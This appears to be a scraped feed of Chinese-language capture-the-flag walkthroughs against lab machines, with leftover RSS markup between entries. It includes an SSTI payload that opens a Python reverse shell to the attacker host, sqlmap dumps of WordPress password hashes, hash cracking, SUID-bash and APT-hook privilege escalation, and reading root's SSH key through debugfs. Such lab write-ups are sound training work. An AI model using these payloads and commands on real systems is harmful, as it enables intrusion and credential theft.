bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

传脚本（其实是我靶机抽风了，少了个bash）

```
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:54--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... failed: Connection refused.
bash-4.4$ wget 192.168.205.128/linpeas.sh
--2025-02-09 10:08:59--  http://192.168.205.128/linpeas.sh
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[========================================================================================================================================&gt;] 820.08K  --.-KB/s    in 0.003s  

2025-02-09 10:08:59 (269 MB/s) - ‘linpeas.sh’ saved [839766/839766]

bash-4.4$ chmod +x linpeas.sh 
bash-4.4$ bash linpeas.sh 
```

也没有，重装吧

```
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.152] 48504
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$ id
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah)
bash-4.4$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/bin/bash
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/procmail
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

```

bash -p

```
bash-4.4$ bash -p
bash -p
id
uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnhub_Funbox_%20GaoKao.html</guid><pubDate>Fri, 27 Jun 2025 09:34:06 +0000</pubDate></item><item><title>thl_THLCPPT_V16笔记</title><link>https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</link><description># thl_THLCPPT_V16笔记

**靶机**：https://thehackerslabs.com/thlcpptv16/

**难度**：专家（EXPERTO）

**目标 IP**：192.168.205.152
**本机 IP**：192.168.205.141

# 1.端口枚举及服务探测

使用 `nmap` 扫描目标 IP 的开放端口：

```
nmap 192.168.205.152
```

![image](https://github.com/user-attachments/assets/c9e617e5-96af-47a7-832e-7ea63715d9d6)

访问 80 端口

![image](https://github.com/user-attachments/assets/b8625cb6-3e5c-483b-aa82-6ccbfc550f2a)

点击 Ir al Examen 发现子域，分别为：

1. examen.thlcpptv16.thl
2. thlcpptv16.thl

将这两个域名添加到 `/etc/hosts` 文件中，进一步探查。

![image](https://github.com/user-attachments/assets/dc44dd45-d812-4514-ac6b-8d114af6acba)

打开 `examen.thlcpptv16.thl`，发现目标运行了 **WordPress**。

# 2.Wordpress 枚举

使用 **wpscan** 进行 WordPress 用户枚举：

```
wpscan --url examen.thlcpptv16.thl -e vp,u --api-token xxx   #api-token注册wpscan官网获取
```

扫描结果显示以下用户：

1. **examinador**
2. **tom**
3. **jerry**

![image](https://github.com/user-attachments/assets/9bcae154-f035-4d1d-b807-d6722bc3749a)

用户较多，因此我们尝试 SQL 注入漏洞。关于该漏洞的更多信息可以参考

&gt; [!IMPORTANT]
&gt;
&gt; 1. https://wpscan.com/vulnerability/2b5860f1-f029-496a-a479-082b78c5bda4
&gt; 2. https://www.tenable.com/security/research/tra-2023-40

![image](https://github.com/user-attachments/assets/d54e46b9-e1d9-4ae4-959d-533c500828fc)

![image](https://github.com/user-attachments/assets/48e4be02-5f6e-4566-bd5c-134fbc36e90d)

# 3.SQL 注入漏洞利用

尝试构造 SQL 注入 payload，利用漏洞获取 WordPress 数据库中的用户信息：

```
http://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&amp;to=1*
```

然后使用 **sqlmap** 进行自动化注入，提取用户信息：

```
sqlmap -u 'examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&amp;to=1*' --batch -D wordpress -T wp_users -C user_login,user_pass --dump
```

输出如下，成功获取到用户的哈希密码：

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| jerry      | $P$B0uohNeAjd6aq3n0dv6NC7Nhkro0Kt. |
| examinador | $P$B43UAoTTnv0stdbxGqzwyQtyXm86x/1 |
| tom        | $P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1 |
+------------+------------------------------------+
```

# 4.Hash 密码爆破

使用 **hashid** 工具识别哈希算法：

```
hashid -e hash
```

![image](https://github.com/user-attachments/assets/3e569c79-85a8-4b52-974f-91f1505f192b)

然后使用 **hashcat** 进行密码爆破：

```
hashcat -a 0 -m 400 hash /usr/share/wordlists/q5000.txt
```

![image](https://github.com/user-attachments/assets/46a062a2-b8ac-46dd-9edc-2a7030aa7854)

爆破成功，获得了 `tom` 用户凭证

# 5.WrapWrap Filter 漏洞

&gt; [!IMPORTANT]
&gt; https://github.com/ambionics/wrapwrap

![image](https://github.com/user-attachments/assets/d2ff7f6f-34e7-4931-885f-74ce45c5b96e)

![image](https://github.com/user-attachments/assets/d618e2ae-0b45-4a3c-856d-5d24b5838035)

通过利用WrapWrap漏洞，构造攻击：

```
git clone https://github.com/ambionics/wrapwrap.git
git clone https://github.com/cfreal/ten.git
cd ten
python3 -m venv ./venv
source ./venv/bin/activate
pip install .
python3 wrapwrap.py /etc/passwd '{'message':'' ''}' 1300
python3 -m http.server 9000
```

![image](https://github.com/user-attachments/assets/8fa3956f-d1ea-40cf-8659-ecb8a3a52f04)

看看他提示的泄漏信息是什么

```
python3 wrapwrap.py /var/www/examen.thlcpptv16.thl/wp-config.php  '{'message':'' ''}' 1300
```

![image](https://github.com/user-attachments/assets/08eb3101-eae7-4d76-b161-a2923014f797)

成功通过 `wrapwrap.py` 获取 tom 密码。

# 6.SSH 登录与提权

查看 tom 家目录下的敏感信息

![image](https://github.com/user-attachments/assets/abb3f249-2485-4f6e-ac74-4ad80a8b5dea)

```
cat ./bashrc
```

![image](https://github.com/user-attachments/assets/f94ac21e-1b78-43cf-83e2-d562255805d3)

发现一个 rafael 用户的帐号和密码

![image](https://github.com/user-attachments/assets/65b15b69-d3a3-47d4-888a-918e43705fb3)

在/var/backup/目录上发现了一个名为 **passwd.dll** 的文件，属于用户 `jerry`。虽然内容是可读的，但似乎使用了某种编码。
最后通过使用rot13解码获得其内容进行解码，成功获取了 `jerry` 用户的 SSH 密钥

&gt; [!IMPORTANT]
&gt; https://rot13.com/

有了这些凭证，我们要做的第一件事就是进入 Rafael 的机器。

![image](https://github.com/user-attachments/assets/587d5b54-120a-41f7-9358-20f254f98481)

查看 sudo 权限看看有没有惊喜

![image](https://github.com/user-attachments/assets/6f8a870e-d91e-45b6-a838-32bbd15fcdcc)

vim 提权有很多方式，可以通过 gtfobins查看，我的方式是进入 vim 然后进入命令模式,`!/bin/bash` 提权

&gt; [!IMPORTANT]
&gt; https://gtfobins.github.io/

具体就是先输入 `:` 再输入 `!/bin/bash`

# 7.VPN 隧道与进一步渗透

查看 `根` 目录，发现一个名为 `tunnelRafael.conf` 的文件，它与 VPN（虚拟专用网络）工具 WireGuard 的典型配置相匹配。

![image](https://github.com/user-attachments/assets/e53b5f4b-799e-44cb-86b5-bebcbe269a2a)

先使用Ligolo-NG把隧道建立一下

&gt; [!IMPORTANT]
&gt; https://github.com/nicocha30/ligolo-ng

```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.101.0.0/28 dev ligolo
./ligolo-agent -connect 192.168.205.141:11601 -ignore-cert
ligolo-proxy -selfcert
```

现在我们已经使用代理手段在目标网络内了，然后通过 WireGuard 连接 VPN（这里记得把 `tunnelRafael.conf` 托到攻击机）

```
sudo apt install wireguard-tools resolvconf
wg-quick up tunnelRafael.conf
```

![image](https://github.com/user-attachments/assets/bf6081a9-6418-4531-ba38-ecf7af7afbfb)

建立成功，网段为 10.13.13.0/24

扫描到通过 VPN 建立的子网 **10.13.13.0/24**

```
fping -asgq 10.13.13.0/24
```

![image](https://github.com/user-attachments/assets/53939c0f-4585-4095-9e62-4b4d3b66c8b8)

根据推测可以看出应该是 10.13.13.3，扫描一下 22 端口是不是开放的，因为我们还有一个 `jerry` 用户信息没用过

```
nmap -p22 -Pn 10.13.13.3
```

![image](https://github.com/user-attachments/assets/22fc3b72-3125-4a48-954d-3828b7e2d389)

确实是开放的，连接上去

![image](https://github.com/user-attachments/assets/5775c59b-9752-47a6-aae0-e17ac45e9efa)

甩了一个 Linpeas 脚本,我们得知用户 `jerry` 属于 `sistema` 组，他能够写入 `/etc/apt/apt.conf.d`，那我们可以在更新软件包使用 APT 命令修改 bash 权限。

```
echo 'APT::Update::Pre-Invoke:: {'chmod u+s /bin/bash'};' &gt; /etc/apt/apt.conf.d/01ab
```

![image](https://github.com/user-attachments/assets/5dd2d63a-355a-4480-a0ba-da2cbdf81215)

找到了 **jerry** 凭证，使用这个凭证再重新连接主 ip

![image](https://github.com/user-attachments/assets/5b778922-ef9e-4af3-b23d-d2a28a2f7b02)

查看 sudo 权限可以看到我们可以**以 root 身份运行 nginx，**  通过 google 搜索可以发现一个关于nginx 的漏洞

&gt; [!IMPORTANT]
&gt; https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

```
./exploit.sh
ssh -i /home/jerry/.ssh/id\_rsa root@127.0.0.1
```

拿下 rootsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_THLCPPT_V16-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:34:01 +0000</pubDate></item><item><title>thl_sinplomo98笔记</title><link>https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</link><description># thl_sinplomo98笔记

**靶机**：https://thehackerslabs.com/sinplomo98/
**难度**：高级（AVANZADO）
**攻击ip**:192.168.205.141
**靶机ip**:192.168.205.157

# 1.端口扫描

首先使用`nmap`扫描目标机器的开放端口：

```
nmap 192.168.205.157
```

![image](https://github.com/user-attachments/assets/35d20d5f-2eb5-461b-a2aa-e2ff6bcdff3f)

通过扫描，发现目标机器上开放了多个端口，其中21端口（FTP服务）和5000端口（Web服务）我比较感兴趣。
先看21 ftp服务

# 2. FTP服务探测

```
ftp 192.168.205.157

#使用匿名登录
anonymous 
anonymous

ls
mget supermegaultraimportantebro.txt
cat supermegaultraimportantebro.txt
```

![image](https://github.com/user-attachments/assets/0a02e140-b0df-406b-bd17-2251aa43f2ea)
呵！就不[狗头]

# 3. Web服务探测

接下来，访问目标的80端口，进行模糊测试，但未能发现什么有用的信息。继续探测5000端口，发现是Web服务。

看看源代码有没有提示

![image](https://github.com/user-attachments/assets/ff805305-85d4-4c31-8d64-2dc135498bc4)

根据页面的提示，加上路径测试。

![image](https://github.com/user-attachments/assets/fb34ab9b-90d7-4373-beb6-04948a83a1f0)

# 4.SSTI利用

经测试，确认该Web服务存在Server-Side Template Injection（SSTI）漏洞
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
尝试执行基本的模板语法：

```
{{8*8}}
```

通过以下payload执行远程命令：

```
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.205.141',8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('bash')')}}
    {% endif %}
{% endfor %}

```

# 5. 权限提升

使用Linpeas脚本进行权限提升检查，发现目标系统属于disk组并存在SUID提取漏洞。

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)

```
#查看系统分区和文件系统信息
df -h
#使用debugfs查看文件
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

通过拿到id_rsa文件后，使用John进行爆破，最终获取root权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_sinplomo98-bi-ji.html</guid><pubDate>Fri, 27 Jun 2025 09:33:59 +0000</pubDate></item><item><title>thl_Offensive</title><link>https://7r1UMPHK.github.io/post/thl_Offensive.html</link><description># thl_Offensive

**靶机**：[thehackerslabs - offensive](https://thehackerslabs.com/offensive/)
**难度**：专业（PROFESIONAL）
**目标 IP**：192.168.205.220
**本机 IP**：192.168.205.141

---

## 1. 端口枚举及服务探测

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.220
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 11:32 CST
Nmap scan report for 192.168.205.220
Host is up (0.00034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
8080/tcp open  http    Node.js Express framework
MAC Address: 08:00:27:B1:A8:86 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

从 `nmap` 扫描结果来看，目标机器开放了 **22** (SSH) 、 **80** (HTTP) 端口、**8080**(HTTP) 端口。

其中80是**Apache httpd 2.4.62**的服务，8080是**Node.js 架构**，我们上去网页看看

---

## 2.踩点

### 80端口

![image](https://github.com/user-attachments/assets/819ee2bc-b088-4fae-bf3a-085e6092abf4)

明显可以看出有一个域名`offensive.thl`加入我们的hosts文件中，继续踩点可以发现，这个网页是个博客，那我们探测一下架构。

```bash
└─$ whatweb http://offensive.thl/       
http://offensive.thl/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.205.220], MetaGenerator[WordPress 6.7.1], Script, Title[rodgar], UncommonHeaders[link], WordPress[6.7.1]

```

是**WordPress 6.7.1**的，我们利用**wpscan**进行探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:51:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://offensive.thl/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 19

[+] Finished: Wed Jan  1 12:52:18 2025
[+] Requests Done: 56
[+] Cached Requests: 8
[+] Data Sent: 11.653 KB
[+] Data Received: 288.726 KB
[+] Memory used: 268.75 MB
[+] Elapsed time: 00:00:19
                                                  
```

获得一个用户名`administrator`，就没有其他重要的信息了，我们进行爆破一下密码

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 12:54:01 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[i] Could not find a login interface to perform the password attack against

[i] No Valid Passwords Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 18

[+] Finished: Wed Jan  1 12:54:04 2025
[+] Requests Done: 142
[+] Cached Requests: 39
[+] Data Sent: 29.128 KB
[+] Data Received: 21.362 KB
[+] Memory used: 245.344 MB
[+] Elapsed time: 00:00:03
                   


[i] Could not find a login interface to perform the password attack against

[i] 无法找到登录界面来执行密码攻击
```

不知道为什么找不到，我也无法访问登录点，那我们去探测一下**8080**端口吧。

打开网址，他说无法GET /	怎么看起来像API呀，目录爆破一下。

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://offensive.thl:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://offensive.thl:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 203]
/cat                  (Status: 500) [Size: 31]
/Help                 (Status: 200) [Size: 203]
/ls                   (Status: 200) [Size: 176]
/rm                   (Status: 500) [Size: 45]
/Cat                  (Status: 500) [Size: 31]
Progress: 49633 / 6369165 (0.78%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 51095 / 6369165 (0.80%)
===============================================================
Finished
===============================================================

```

查看一下帮助。

![image](https://github.com/user-attachments/assets/aa4bd96d-99b6-4f0c-b204-76a776e4eddb)

可以下载、查看、删除，但是限制在`/var/www`，那我们查看一下有什么文件。

![image](https://github.com/user-attachments/assets/82d60f3a-df63-4105-b95a-8121ca79dea5)

有意思，我们看看**wordress**中有没有我们没有探测出来的**plugins**。

![image](https://github.com/user-attachments/assets/4bd23546-7d72-4ac2-9b55-f3d7b2fa032a)

真多啊，我比较对`akismet`、`wps-hide-login`、`wpterm`感兴趣，搜索一下他们有没有漏洞。

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit akismet
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                             | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                | php/webapps/30036.html
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ searchsploit wps-hide-login 
Exploits: No Results
Shellcodes: No Results
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ searchsploit wpterm     
Exploits: No Results
Shellcodes: No Results
                                
```

只有一个跨站点，我们用不上，但是我发现了点问题，`wps-hide-login`是什么东西啊，触发了我关键词，搜索一下。

![image](https://github.com/user-attachments/assets/a014b2ce-d98a-4762-b648-65d6dbdb956b)

原来就是你让我爆破不了[生气]，进你目录看看。

![image](https://github.com/user-attachments/assets/40a293ec-8fc3-474b-92fe-4d19af4a276f)

得到了一个版本号，我去搜索了一下`wps-hide-login`的exploit，没有这个版本的，这个是最新版，难办了......

我忽然想到一个问题，以前搭博客加插件的话，如果那个插件不要了，直接把那个目录删了它就会消失，我不知道**WordPress**是不是这种机制，试试吧，不行就重装

![image](https://github.com/user-attachments/assets/ab524259-acc2-4c3f-820e-620e26da7e1b)

尝试可不可以登录。

![image](https://github.com/user-attachments/assets/b6592349-bf94-430b-ad0c-214e4b453084)

还真行，再爆破一次密码。

```bash
┌──(kali㉿kali)-[~/test]
└─$ wpscan --url http://offensive.thl:80 -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 13:23:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
^Cying administrator / ripper Time: 00:01:13 &lt;                                                &gt; (9060 / 14344392)  0.06%  ETA: 32:11:33
[i] No Valid Passwords Found.

^Cying administrator / reyrey Time: 00:01:13 &lt;                                                &gt; (9063 / 14344392)  0.06%  ETA: 32:11:19
Scan Aborted: Canceled by User
                           
```

9000+都爆破不出来，那意思是在什么地方藏着？

```bash
┌──(kali㉿kali)-[~/test]
└─$ wget -r -np http://offensive.thl    
--2025-01-01 13:26:20--  http://offensive.thl/
正在解析主机 offensive.thl (offensive.thl)... 192.168.205.220
正在连接 offensive.thl (offensive.thl)|192.168.205.220|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：未指定 [text/html]
正在保存至: “offensive.thl/index.html”

```

下载了一份网页没有结果，我记得好像那个API可以下载来着，下载一份下来。

![image](https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab)

先帝创业未半而中道崩殂，mmp，那没办法了，就在这个API探索吧。

![image](https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38)

在`/image/`目录下找到一个有意思的图片。

![image](https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7)

啊这......属实是文化输出了，哈哈哈。

```bash
┌──(kali㉿kali)-[~/test]
└─$ wget http://offensive.thl/images/wp-login.jpg                     
--2025-01-01 13:34:42--  http://offensive.thl/images/wp-login.jpg
正在解析主机 offensive.thl (offensive.thl)... 192.168.205.220
正在连接 offensive.thl (offensive.thl)|192.168.205.220|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：648072 (633K) [image/jpeg]
正在保存至: “wp-login.jpg”

wp-login.jpg                      100%[============================================================&gt;] 632.88K  --.-KB/s  用时 0.001s  

2025-01-01 13:34:42 (477 MB/s) - 已保存 “wp-login.jpg” [648072/648072])

                                                                              
┌──(kali㉿kali)-[~/test]
└─$ exiftool wp-login.jpg 
ExifTool Version Number         : 13.00
